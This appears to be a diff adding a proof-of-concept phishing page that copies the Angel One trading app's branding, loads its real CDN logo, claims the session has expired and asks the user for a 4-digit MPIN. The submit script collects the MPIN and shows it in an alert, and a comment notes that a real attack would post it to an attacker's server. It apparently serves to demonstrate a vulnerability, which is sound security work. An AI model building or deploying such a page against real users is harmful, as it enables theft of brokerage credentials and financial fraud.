@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Angel One</title>
+  <link rel="icon" href="https://cdn.angelone.in/sparkweb2-O/images/sonic-favicon-new.png"/>
+  <style>
+    @font-face {
+      font-family: "Roboto";
+      src: url("https://cdn.angelone.in/sparkweb2-O/fonts/roboto.woff2") format("woff2");
+      font-weight: 400 700;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: "Roboto", sans-serif;
+      background: #F5F5F5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      padding: 2.5rem 2rem;
+      width: 360px;
+      box-shadow: 0 4px 24px rgba(0,0,0,.10);
+      text-align: center;
+    }
+    .logo-wrap {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 1.5rem;
+    }
+    .logo-wrap img { height: 36px; }
+    .logo-wrap span {
+      font-size: 1.35rem;
+      font-weight: 700;
+      color: #1A1A1A;
+      letter-spacing: -.3px;
+    }
+    .logo-wrap span b { color: #E8391D; }
+    .session-badge {
+      background: #FFF4F2;
+      border: 1px solid #FCD5CE;
+      color: #C0351A;
+      font-size: .8rem;
+      border-radius: 6px;
+      padding: .4rem .8rem;
+      margin-bottom: 1.4rem;
+      display: inline-block;
+    }
+    h2 {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: #1A1A1A;
+      margin-bottom: .4rem;
+    }
+    p {
+      font-size: .85rem;
+      color: #666;
+      margin-bottom: 1.6rem;
+      line-height: 1.5;
+    }
+    .mpin-row {
+      display: flex;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 1.8rem;
+    }
+    .mpin-row input {
+      width: 52px;
+      height: 56px;
+      border: 2px solid #ddd;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 1.4rem;
+      font-family: "Roboto", sans-serif;
+      outline: none;
+      transition: border .2s;
+      color: #1A1A1A;
+    }
+    .mpin-row input:focus { border-color: #E8391D; }
+    .btn {
+      width: 100%;
+      padding: .85rem;
+      background: #E8391D;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 600;
+      font-family: "Roboto", sans-serif;
+      cursor: pointer;
+      transition: background .2s;
+    }
+    .btn:hover { background: #C72F16; }
+    .forgot {
+      margin-top: 1rem;
+      font-size: .82rem;
+      color: #E8391D;
+      cursor: pointer;
+      text-decoration: underline;
+    }
+    .divider {
+      height: 1px;
+      background: #eee;
+      margin: 1.4rem 0;
+    }
+    .user-chip {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 1.2rem;
+    }
+    .avatar {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      background: #FFE8E3;
+      color: #E8391D;
+      font-weight: 700;
+      font-size: .95rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .user-info { text-align: left; }
+    .user-info .name { font-size: .9rem; font-weight: 600; color: #1A1A1A; }
+    .user-info .uid  { font-size: .75rem; color: #888; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="logo-wrap">
+    <img src="https://cdn.angelone.in/sparkweb2-O/images/angel-logogram-sonic.svg" alt="Angel One"/>
+    <span>Angel <b>One</b></span>
+  </div>
+
+  <div class="session-badge">:warning: Session expired</div>
+
+
+
+  <h2>Enter your MPIN</h2>
+  <p>Your session has expired due to inactivity.<br/>Please enter your 4-digit MPIN to continue.</p>
+
+  <div class="mpin-row" id="mpinRow">
+    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
+    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
+    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
+    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]"/>
+  </div>
+
+  <button class="btn" onclick="submit()">Confirm &amp; Continue</button>
+  <div class="forgot">Forgot MPIN?</div>
+  <div class="divider"></div>
+  <div style="font-size:.75rem;color:#aaa;">Secured by Angel One &nbsp;:lock:</div>
+</div>
+
+<script>
+  // Auto-advance between MPIN boxes
+  const inputs = document.querySelectorAll('#mpinRow input');
+  inputs.forEach((inp, i) => {
+    inp.addEventListener('input', () => {
+      if (inp.value && i < inputs.length - 1) inputs[i + 1].focus();
+    });
+    inp.addEventListener('keydown', e => {
+      if (e.key === 'Backspace' && !inp.value && i > 0) inputs[i - 1].focus();
+    });
+  });
+
+  function submit() {
+    const mpin = [...inputs].map(i => i.value).join('');
+    if (mpin.length < 4) { inputs[0].focus(); return; }
+    // PoC: In a real attack this POSTs to attacker's server
+    alert('PoC captured MPIN: ' + mpin);
+  }
+</script>
+</body>
+</html>
